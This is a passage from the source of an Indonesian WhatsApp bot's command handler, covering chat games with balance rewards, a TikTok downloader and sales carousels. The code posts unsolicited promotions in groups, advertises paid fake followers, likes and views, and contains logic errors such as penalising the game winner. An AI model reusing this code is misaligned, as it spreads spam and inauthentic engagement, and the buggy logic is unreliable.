let plerDits = `https://pomf2.lain.la/f/7ixvc40h.mp3`
Ditss.sendMessage(m.chat, {audio: {url: plerDits}, mimetype: 'audio/mpeg', ptt: true }, { quoted: m})
}
        
if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await Ditss.sendMessage(m.chat, {text: `
*${global.namaOwner} Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup Bebas Promosi 1 :*
https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy
* *Grup Bebas Promosi 2 :*
https://chat.whatsapp.com/CWO0TqYeCVbIoY4YzsTxb7
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s

*👤 Contact*
* *WhatsApp Utama :*
+6285882135288
* *WhtasApp Cadangan :*
+628386890336
https://t.me/skyzodev
`}, {quoted: null})
}
}


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
//await m.reply(check.respon)
await Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/spam.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}
}
// PENGALIH
if (isCmd && isBanned) return reply('anda di banned oleh owner karna spam!')
//===============
        if (isCmd) {
      if (!isCreator && !isPremium && db.users[m.sender].limit < 1) return m.reply("limit anda habis😹 limit akan di riset pada jam 00:00");
db.users[m.sender].hitcmd += 1;
db.users[m.sender].limit -= 1;

    // }
} else {
}
//============= [ FUNCTION ] ======================================================
 // FUNCTION RESET ALL USER LIMIT 24 JAM
cron.schedule('0 0 0 * * *', () => {
Object.values(users).filter(v => v.premium == false).map(v => v.limit = 100);
Object.values(users).filter(v => v.premium == true).map(v => v.limit = 800);
}, { scheduled: true, timezone: 'Asia/Jakarta' });


// FUNCTION SUIT PVP POLLING 
let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
if (roof) {
let win = ''
let tie = false
if (sender == roof.p2 && /^(acc(ept)?|y|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(body) && m.isGroup && roof.status == 'wait') {
if (/^(gamau|nanti|ga(k.)?bisa)/i.test(body)) {
minSaldo(m.sender, 1000, db_saldo)
pokl = `@${roof.p2.split('@')[0]} menolak suit, suit dibatalkan\nDan player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
await Ditss.sendText(from, pokl, m)
delete suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)

teksbbb = `AYO PILIH SUIT MU`
ggy = `Suit telah dikirimkan ke chat

@${roof.p.split('@')[0]} dan @${roof.p2.split('@')[0]}

Silahkan pilih suit di chat masing"
klik wa.me/${botNumber.split('@')[0]}`
await Ditss.sendText(from, ggy, fsaluran)
if (!roof.pilih) await Ditss.sendPoll(roof.p, teksbbb, [`batu`,`kertas`,`gunting`, ])
if (!roof.pilih2) await Ditss.sendPoll(roof.p2, teksbbb, [`batu`,`kertas`,`gunting`, ])
roof.waktu_milih = setTimeout(async() => {
if (!roof.pilih && !roof.pilih2) await Ditss.sendMessage(from, {text: `Kedua pemain tidak niat main,\nSuit dibatalkan`})
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
minSaldo(m.sender, 1000, db_saldo)
sffp = `@${(roof.pilih ? roof.p2 : roof.p).split('@')[0]} tidak memilih suit, game berakhir\nDan Player dikenakan sanksi pengurangan Rp. 1,000 saldo karna menolak ajakan pemain`
await m.reply(sffp)
}
delete suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = sender == roof.p
let jwb2 = sender == roof.p2
let g = /.gunting/i
let b = /.batu/i
let k = /.kertas/i
let reg = /^(.gunting|.batu|.kertas)/i
if (jwb && reg.test(body) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(body.toLowerCase())[0]
roof.text = body
await Ditss.sendMessage(from, {text: `Kamu telah memilih ${body} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`}, {quoted:fsaluran})
if (!roof.pilih2) await Ditss.sendMessage(roof.p2, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
if (jwb2 && reg.test(body) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(body.toLowerCase())[0]
roof.text2 = body

tyu = `Kamu telah memilih ${body} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`
await Ditss.sendMessage(from, {text: tyu}, {quoted:m})

if (!roof.pilih) await Ditss.sendMessage(roof.p, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
await Ditss.sendText(roof.asal, `${tie ? '*HASIL SERI*\n\n' : ''}@${roof.p.split('@')[0]} *${roof.text}* ${tie ? '' : roof.p == win ? ' Menang' : ' Kalah'}\n@${roof.p2.split('@')[0]} *${roof.text2}* ${tie ? '' : roof.p2 == win ? ' Menang' : ' Kalah'}${tie ? '' : '\n\nHadiah Saldo : 2,000 '}`, f1('HASIL SUIT PVP', null))
if (roof.p == win) {
roof.p == win ? minSaldo(users[roof.p], 2000, db_saldo) : minSaldo(users[roof.p], 1000, db_saldo)
} else if (roof.p2 == win) {
roof.p2 == win ? addSaldo(users[roof.p2], 2000, db_saldo) : minSaldo(users[roof.p2], 1000, db_saldo)
}
delete suit[roof.id]
}
}

// Auto download tiktok
if (
  budy.startsWith('https://vt.tiktok.com/') || 
  budy.startsWith('https://www.tiktok.com/') || 
  budy.startsWith('https://t.tiktok.com/') || 
  budy.startsWith('https://vm.tiktok.com/')
) {
  Ditss.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  try {
    const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(budy)}`);
    const vidnya = data?.video?.noWatermark;
    if (vidnya) {
      const caption = `*[ TIKTOK DOWNLOADER ]*
${readmore}
*Video dari*: _${data.author?.name ?? 'Tidak diketahui'} (@${data.author?.unique_id ?? 'Tidak diketahui'})_
*Likes*: _${data.stats?.likeCount ?? 'Tidak diketahui'}_
*Comments*: _${data.stats?.commentCount ?? 'Tidak diketahui'}_
*Shares*: _${data.stats?.shareCount ?? 'Tidak diketahui'}_
*Plays*: _${data.stats?.playCount ?? 'Tidak diketahui'}_
*Saves*: _${data.stats?.saveCount ?? 'Tidak diketahui'}_
*Title*: _${data.title ?? 'Tidak diketahui'}_

\`⏤͟͟͞͞ Downloader By ${botname2}\``;

      await Ditss.sendMessage(
        m.chat, 
        { caption, video: { url: vidnya } }, 
        { quoted: m }
      );
    } else {
      const nyut = await tiktokDl(budy);
      await Ditss.sendMessage(
        m.chat, 
        {
          caption: `Judul: ${nyut.title ?? 'Tidak diketahui'}\nDeskripsi: ${nyut.description ?? 'Tidak diketahui'}`,
          video: { url: nyut.downloadLink || nyut.hdDownloadLink },
        },
        { quoted: m }
      );
    }
  } catch (error) {
    console.error(error);
    m.reply('Maaf, terjadi kesalahan saat memproses permintaan Anda.');
  }
}
//ppp
const asumaSaldo = ` ${toRupiah(cekSaldo(m.sender, db_saldo))}`
const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}
function monospace(string) {
return '```' + string + '```'
}
function monospa(string) {
return '`' + string + '`'
}
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
// FUNCTION PETAK BOMB 
let pilih = "🌀", bomb = "💣";
if (sender in petakbom) {
if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
if (petakbom[sender].petak[parseInt(body) - 1] === 1) return !0;
if (petakbom[sender].petak[parseInt(body) - 1] === 2) {
petakbom[sender].board[parseInt(body) - 1] = bomb;
petakbom[sender].pick++;
Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
petakbom[sender].bomb--;
petakbom[sender].nyawa.pop();

let brd = petakbom[sender].board;
if (petakbom[sender].nyawa.length < 1) {
await m.reply(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.join("")}\n\n*Terpilih :* ${petakbom[sender].pick}\n*Pengurangan Saldo :* Rp. 100`);
Ditss.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
minSaldo(sender, 100, db_saldo)
delete petakbom[sender];
} else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.join("")}\n\nTerpilih: ${petakbom[sender].pick}\nSisa nyawa: ${petakbom[sender].nyawa}`);
return !0;
}
if (petakbom[sender].petak[parseInt(body) - 1] === 0) {
petakbom[sender].petak[parseInt(body) - 1] = 1;
petakbom[sender].board[parseInt(body) - 1] = pilih;
petakbom[sender].pick++;
petakbom[sender].lolos--;
let brd = petakbom[sender].board;
if (petakbom[sender].lolos < 1) {
await m.reply(`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join("")}\n\n*Terpilih :* ${petakbom[sender].pick}\n*Sisa nyawa :* ${petakbom[sender].nyawa}\n*Bomb :* ${petakbom[sender].bomb}\n*Hadiah Saldo :* Rp. 250`);
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})
addSaldo(q.split(`250`)[0]+"@s.whatsapp.net", Number(q.split(`${m.sender}`)[1]), db_saldo)
delete petakbom[sender];
} else m.reply(`*PILIH ANGKA*\n\n${brd.join("")}\n\nTerpilih : ${petakbom[sender].pick}\nSisa nyawa : ${petakbom[sender].nyawa}\nBomb : ${petakbom[sender].bomb}`)
}
}
// GAME TEBAK GAMBAR 

if ((from in tebakgambar)) {
let { soal, jawaban, hadiah, waktu } = tebakgambar[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${tebakgambar[from].jawaban}*`);
delete tebakgambar[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 150`);
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})
addSaldo(m.sender, 150, db_saldo)
clearTimeout(waktu);
delete tebakgambar[from];
} else Ditss.sendMessage(sender, {react: {text: '❌', key: m.key}})
if (similarity(m.text, userdb.jawaban) >= threshold) return m.reply("*Hampir benar. . .*")
}

// GAME TEBAK ANIME 
if ((from in tebakanime)) {
let { soal, jawaban, hadiah, waktu } = tebakanime[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakanime[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete tebakanime[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK LAGU 
if ((from in tebaklagu)) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebaklagu[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete tebaklagu[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME KUIS 
if ((from in kuis)) {
let { soal, jawaban, hadiah, waktu } = kuis[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete kuis[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete kuis[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME SIAPAKAH AKU 
if ((from in siapakahaku)) {
let { soal, jawaban, hadiah, waktu } = siapakahaku[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete siapakahaku[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete siapakahaku[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KALIMAT 
if ((from in tebakkalimat)) {
let { soal, jawaban, hadiah, waktu } = tebakkalimat[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkalimat[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})
clearTimeout(waktu);
delete tebakkalimat[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KATA 
if ((from in tebakkata)) {
let { soal, jawaban, hadiah, waktu } = tebakkata[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkata[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n\n*Game :* Tebak Kata\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})
clearTimeout(waktu);
delete tebakkata[from];
} else await Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

//oke
// GAME TEBAK LIRIK 
if ((from in tebaklirik)) {
let { soal, jawaban, hadiah, waktu } = tebaklirik[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebaklirik[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete tebaklirik[from];
} else await Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KIMIA 
if ((from in tebakkimia)) {
let { soal, jawaban, hadiah, waktu } = tebakkimia[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkimia[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})
clearTimeout(waktu);
delete tebakkimia[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK BENDERA 
if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakbendera[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete tebakbendera[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME ASAH OTAK 
if ((from in asahotak)) {
let { soal, jawaban, hadiah, waktu } = asahotak[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete asahotak[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete asahotak[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME SUSUN KATA 
if ((from in susunkata)) {
let { soal, jawaban, hadiah, waktu } = susunkata[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete susunkata[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete susunkata[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
if (similarity(m.text, userdb.jawaban) >= threshold) return m.reply("*Hampir benar. . .*")
}

// GAME CAK LONTONG 
if ((from in caklontong)) {
let { soal, jawaban, hadiah, waktu } = caklontong[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete caklontong[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete caklontong[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME KUIS MATH 
if ((from in kuismath)) {
let { soal, jawaban, hadiah, waktu } = kuismath[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete kuismath[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete kuismath[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME FAMILY 100 
if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (budy.toLowerCase() == "nyerah") {
await m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 0`);
delete family100[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban.length < 1 ? 'Selamat semua jawaban sudah tertebak!\ningin bermain lagi? kirim '+prefix+'family100' : 'Jawaban yang belum tertebak: '+jawaban.length}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})
clearTimeout(waktu);
delete family100[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family100[from];
}
}
        
const Reply = async (teks) => {
return Ditss.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qkontak})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Ditss.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*Iannz Official* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Iannz Official Menyediakan 🌟*

* Vps Digital Ocean 2GB - 16GB
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup  Bebas Promosi 1 :*
https://chat.whatsapp.com/Lue3cXuHlIfDSccEWKi7AP
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VakO7HhEVccDSnbpXY1k`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Vps Digital Ocean🌟*

_*Promo Vps Digital Ocean*_
* Ram 2 Core 2 Rp 25.000
* Ram 4 Core 2 Rp 35.000
* Ram 8 Core 4 Rp 45.000
* Ram 16 Core 4 Rp 55.000
𝘽𝙚𝙣𝙚𝙛𝙞𝙩
>̶>̶ Free Install Panel Pterodactyl
>̶>̶ Free Install Nodes+Wings
>̶>̶ Free Req domain
>̶>̶ Free Req Os, Versi, Region
>̶>̶ Full Akses Vps
>̶>̶ Masa Aktif 30 Hari Garansi 25 Hari
>̶>̶ Free Install Thema 8-16 Ram`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Ditss.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}
//btas
const getcomandces = (cases) => {
    try {
        const fileContent = fs.readFileSync('./case.js').toString();
        let caseContent = fileContent.split(`case '${cases}'`);    
        if (caseContent.length === 1) { 
            caseContent = fileContent.split(`case "${cases}"`);
        }
        if (caseContent.length > 1) {
            return "case " + `'${cases}'` + caseContent[1].split("break")[0] + "break";
        } else {
            return "none"; 
        }
    } catch (e) {
        return "none";
    }
};
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
let mean;
let didyoumenn;
async function spawndidyou(our) {
try {
	const code = fs.readFileSync("./case.js", "utf8")
		const regex = /case\s+['"]([^'"]+)['"]:/g;
			var matches = [];
				var match;
				while ((match = regex.exec(code))) {
					matches.push(match[1]);
				}
				const help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean);
				if (!help.includes(our) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
					 mean = didyoumean(our, help);
				let sim = similarity(our, mean);
			let similarityPercentage = parseInt(sim * 100);
		if (mean && our.toLowerCase() !== mean.toLowerCase()) {
    	 didyoumenn = `*\`[ MATCH FOR THIS COMMAND ]\`*\n\nmungkin yang anda maksud adalah: *.${mean}*\npercentase: *${similarityPercentage}%*`
			   /*
			  # similarityPercentage
			  # mean
			  # thaks rijal
			  */
	     } else { return; }
     }
      return 
    Ditss.sendMessage(m.chat, {

  location: {

    degreesLatitude: -6.2088, // Ganti dengan latitude lokasi

    degreesLongitude: 106.8456, // Ganti dengan longitude lokasi

  },

  caption: "Ini adalah lokasi yang dikirim.",

  footer: "© Hikaa",

  buttons: [

          { buttonId: `🚀`,

          buttonText: {

          displayText: '🗿'

          },

           type: 1 }

          ], // isi buttons nya

  headerType: 6,

  viewOnce: true

}, { quoted: null });
 } catch(err) {
 return;
 }
}
//mk
/*if (isCmd) {
     /* console.log(command)
     if (body.match(prefix)) {//drs
        if (m.text.startsWith(prefix)) {
            if (!m.fromMe) {
            const viuc = await getcomandces(command);
                if (body.length === 1) return;
                 if (!command || viuc === "none") return spawndidyou(command)
                 if (isBanned) return reply("*`[ Gumdramon ] tidak bisa mengakses bot`*")
                // Ditss.sendPresenceUpdate(jd, m.chat)
                userdb.hitcmd += 1;          
            } else {
            const viuc2 = await getcomandces(command);
                if (body.length === 1) return;
                 if (!command || viuc2 === "none") return spawndidyou(command)
                  if (isBanned) return reply("*`[ Gumdramon ] tidak bisa mengakses bot`*")
                 //Ditss.sendPresenceUpdate(jd, m.chat)
                userdb.hitcmd += 1;  
            }
        }
    // }
} else {
}*/

//kontol 
const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
